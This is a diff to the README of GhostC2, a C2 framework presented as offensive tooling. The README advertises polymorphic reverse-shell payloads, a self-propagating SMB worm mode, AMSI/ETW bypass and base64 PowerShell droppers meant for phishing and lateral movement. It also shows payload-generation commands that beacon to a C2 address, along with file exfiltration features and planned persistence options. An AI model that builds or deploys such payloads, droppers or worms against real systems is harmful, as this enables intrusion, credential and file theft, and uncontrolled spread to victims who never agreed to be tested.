@@ -1,3 +1,4 @@
+
 # 👻 GhostC2
 
 GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, structured JSON tasking, operator authentication, optional `.exe` packaging, and a fully interactive file browser UI.
@@ -19,6 +20,9 @@ Check out the wiki for an Operator Quickstart Guide.
 * 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
 * 📂 Interactive File Browser UI (NEW, works with obfuscated payloads)
 * 🧬 Self-Propagating Worm Mode via SMB
+* 📎 PowerShell Dropper Generator (.bat, .hta, .vbs)
+* ♻️ Per-payload AES key registration
+* 💾 File Exfil + Live Browse System
 
 ---
 
@@ -43,6 +47,8 @@ GhostC2/
 │   ├── ps_handler.py           # PowerShell reverse shell TCP listener
 │   ├── templates/              # HTML templates for dashboard, console, login
 │   └── payloads/               # (Generated PowerShell payloads)
+├── static/
+│   └── payloads/               # (Droppers: .bat, .hta, .vbs)
 ├── tools/
 │   ├── generate_payload.py     # Payload generator script
 │   └── ps_builder.py           # PowerShell payload builder
@@ -113,6 +119,14 @@ To also compile to `.exe`:
 python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result   --exe
 ```
 
+To enable worm propagation:
+
+```bash
+python tools/generate_payload.py --worm
+```
+
+> Payloads now include a unique AES key and register it with the server on first contact.
+
 ---
 
 ## 📝 Example JSON Tasks
@@ -171,41 +185,9 @@ GhostC2 now supports an interactive file browser for any active beacon, fully co
 * Handles missing/ghost files gracefully
 * Uses structured JSON tasks for full stealth
 
-### Command (via API or dashboard):
-
-```json
-{
-  "action": "browse",
-  "path": "/"
-}
-```
-
-or
-
-```json
-{
-  "action": "browse",
-  "path": "C:\\"
-}
-```
-
-**To use:**
-
-* Click the 📁 "Browse" button for any beacon in the dashboard
-* Navigate folders, see files/sizes, and explore the target system
-
 ---
 
 ## 📂 File Exfiltration
-
-### Command (via API or dashboard):
-
-```json
-{
-  "action": "getfile",
-  "path": "/etc/passwd"
-}
-```
 
 Agent will:
 
@@ -217,16 +199,6 @@ Agent will:
 ---
 
 ## 🔍 Network Scanning
-
-### Command (via API or dashboard):
-
-```json
-{
-  "action": "scan",
-  "subnet": "192.168.0.0/24",
-  "ports": [80, 443, 445, 3389]
-}
-```
 
 Agent will:
 
@@ -262,6 +234,7 @@ GhostC2 now supports polymorphic PowerShell reverse shell payloads for Windows a
 * Auto-appended `PS C:\>`-style prompt
 * Compatible with manual execution or droppers
 * Optionally served via `/generate_ps_payload`
+* AMSI bypass + junk code injection
 
 ---
 
@@ -318,22 +291,6 @@ port = 1443
 
 ---
 
-### 📁 Payload Directory Structure
-
-Generated payloads are stored in:
-
-```
-server/payloads/
-```
-
-They are automatically served via Flask using:
-
-```python
-send_from_directory('payloads', filename)
-```
-
----
-
 ## 🧰 PowerShell Dropper Generator (**NEW**)
 
 GhostC2 now supports **one-click, base64-encoded PowerShell droppers** for Windows phishing and lateral movement, in `.bat`, `.hta`, and `.vbs` formats.
@@ -343,6 +300,8 @@ GhostC2 now supports **one-click, base64-encoded PowerShell droppers** for Windo
 * Supports *any* PowerShell payload (multi-line, obfuscated, AMSI bypass, etc.)
 * Base64-encoding is default and recommended for all wrapper types (`.bat`, `.hta`, `.vbs`)
 * Classic inline mode available for legacy single-line scripts
+
+---
 
 ### 🧪 Generating a Dropper
 
@@ -424,11 +383,12 @@ Base64-encoding is enabled by default and recommended for all dropper types.
 
 ## 🧠 Roadmap
 
-* `.hta`, `.bat`, and `.vbs` wrappers
-* AMSI/ETW bypass options
-* Dashboard-based file download from browser view
-* JSON/structured tasking for *all* agent features
-* Dashboard-based one-liners for download & exec
+* `.hta`, `.bat`, and `.vbs` wrappers ✅
+* AMSI/ETW bypass options ✅
+* Dashboard-based file download from browser view ✅
+* JSON/structured tasking for *all* agent features ✅
+* Dashboard-based one-liners for download & exec 🔜
+* Persistence options: registry, startup folder, scheduled task 🔜
 
 ---
 
@@ -437,17 +397,6 @@ Base64-encoding is enabled by default and recommended for all dropper types.
 * AES-encrypted traffic throughout
 * Operator auth required for all access
 * Session isolation by beacon hostname
-
----
-
-## 🧪 Red Team Use Cases
-
-| Scenario            | Usage                                |
-| ------------------- | ------------------------------------ |
-| Post-exploitation   | Remote shell via encrypted WebSocket |
-| Payload generation  | Obfuscated `.py` or `.exe` files     |
-| Operator dashboards | Web UI for task/result review        |
-| C2 simulations      | Train detection or analyze traffic   |
 
 ---
 
